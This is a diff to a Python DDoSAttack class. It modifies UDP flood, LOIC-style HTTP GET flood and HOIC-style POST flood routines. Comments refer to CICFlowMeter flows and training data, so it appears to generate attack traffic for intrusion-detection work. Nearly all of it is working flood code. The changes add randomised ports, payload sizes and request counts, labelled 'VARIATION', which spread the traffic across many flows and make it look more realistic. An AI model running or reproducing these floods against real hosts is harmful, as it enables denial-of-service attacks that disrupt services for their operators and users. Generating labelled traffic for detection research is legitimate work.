@@ -56,26 +56,28 @@ class DDoSAttack:
     #   TotLen Fwd Pkts, very low Flow IAT, Protocol=17 (UDP).
     # ──────────────────────────────────────────────────────
     def udp_flood(self):
-        """LOIC-UDP: Flood fixed target port with UDP packets at max rate.
-        Unlike the old version that sent to random ports (creating useless 1-pkt flows),
-        this targets a FIXED port so all packets aggregate into one flow."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        """LOIC-UDP: Flood target with UDP packets at high rate.
+        VARIATION: Random destination ports to avoid single-flow grouping."""
         end_time = time.time() + self.duration
-
-        # Fixed payload sizes matching LOIC behavior
+        udp_ports = [53, 123, 161, 514, 1900, 5353, 19132]
         payload_sizes = [512, 1024, 1400]
 
         while self.running and time.time() < end_time:
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(1)
+                
+                # VARIATION: Random destination port (creates multiple flows)
+                port = random.choice(udp_ports)
                 payload_size = random.choice(payload_sizes)
                 data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
-                # Send to FIXED port (same 5-tuple = same CICFlowMeter flow)
-                sock.sendto(data, (self.target_ip, self.target_port))
+                sock.sendto(data, (self.target_ip, port))
                 self._inc_count()
+                sock.close()
             except Exception:
                 pass
-            # Minimal delay for maximum packet rate
-        sock.close()
+            # Minimal delay for high rate
+            time.sleep(random.uniform(0.0001, 0.001))
 
     # ──────────────────────────────────────────────────────
     # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
@@ -83,9 +85,10 @@ class DDoSAttack:
     #   Flow Pkts/s, high TotLen Fwd Pkts, many PSH flags.
     # ──────────────────────────────────────────────────────
     def http_flood(self):
-        """LOIC-HTTP: Rapid HTTP GET requests over persistent TCP connections.
-        Sends hundreds of requests per connection at maximum speed."""
+        """LOIC-HTTP: Rapid HTTP GET requests, multiple connections to different ports.
+        VARIATION: Variable ports and request counts per connection."""
         end_time = time.time() + self.duration
+        http_ports = [80, 8080, 8888, 3000, 5000, 443]
 
         while self.running and time.time() < end_time:
             try:
@@ -93,17 +96,20 @@ class DDoSAttack:
                 sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_LOIC_HTTP)
-                sock.connect((self.target_ip, self.target_port))
+                
+                # VARIATION: Random HTTP port
+                attack_port = random.choice(http_ports)
+                sock.connect((self.target_ip, attack_port))
 
-                # Blast requests on same connection — maximum speed
-                for _ in range(random.randint(100, 500)):
+                # VARIATION: Variable requests per connection (20-200 for high volume but realistic)
+                for _ in range(random.randint(20, 200)):
                     if not self.running or time.time() >= end_time:
                         break
 
-                    path = f"/{_random_string(6)}?{_random_string(4)}={_random_string(8)}"
+                    path = f"/{_random_string(random.randint(6, 12))}?{_random_string(4)}={_random_string(8)}"
                     req = (
                         f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
+                        f"Host: {self.target_ip}:{attack_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Accept: */*\r\n"
                         f"Connection: keep-alive\r\n"
@@ -112,15 +118,13 @@ class DDoSAttack:
                     sock.sendall(req.encode())
                     self._inc_count()
 
-                    # Drain response without waiting
+                    # Drain response
                     try:
                         sock.settimeout(0.01)
                         sock.recv(8192)
                     except socket.timeout:
                         pass
                     sock.settimeout(10)
-
-                    # No sleep — LOIC fires as fast as possible
 
                 sock.close()
             except Exception:
@@ -140,10 +144,10 @@ class DDoSAttack:
     # CRITICAL: Training shows very short connections (2.5 pkts).
     # ──────────────────────────────────────────────────────
     def hoic_flood(self):
-        """HOIC: HTTP POST flood with large payloads, NEW connection per request.
-        HOIC uses 'boosters' — scripts that generate large POST bodies
-        to amplify the bandwidth consumed per request."""
+        """HOIC: HTTP POST flood with large payloads, NEW connection per 1-2 requests.
+        VARIATION: Random ports and body sizes for realistic attack pattern."""
         end_time = time.time() + self.duration
+        http_ports = [80, 8080, 8888, 3000, 5000, 443]
 
         while self.running and time.time() < end_time:
             try:
@@ -151,20 +155,24 @@ class DDoSAttack:
                 sock.settimeout(5)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
-                sock.connect((self.target_ip, self.target_port))
+                
+                # VARIATION: Random HTTP port
+                attack_port = random.choice(http_ports)
+                sock.connect((self.target_ip, attack_port))
 
-                # Send 1-2 POST requests per connection (matching training ~2.5 pkts)
-                requests_this_conn = random.randint(1, 2)
+                # Send 1-3 POST requests per connection (VARIATION on timing)
+                requests_this_conn = random.randint(1, 3)
                 for _ in range(requests_this_conn):
                     if not self.running or time.time() >= end_time:
                         break
 
-                    # Large random POST body (HOIC booster style)
-                    body = _random_string(random.randint(1024, 8192))
-                    path = f"/{_random_string(6)}"
+                    # VARIATION: Variable body size (500-12000 bytes for diversity)
+                    body_size = random.randint(500, 12000)
+                    body = _random_string(body_size)
+                    path = f"/{_random_string(random.randint(5, 12))}"
                     req = (
                         f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
+                        f"Host: {self.target_ip}:{attack_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Content-Type: application/x-www-form-urlencoded\r\n"
                         f"Content-Length: {len(body)}\r\n"
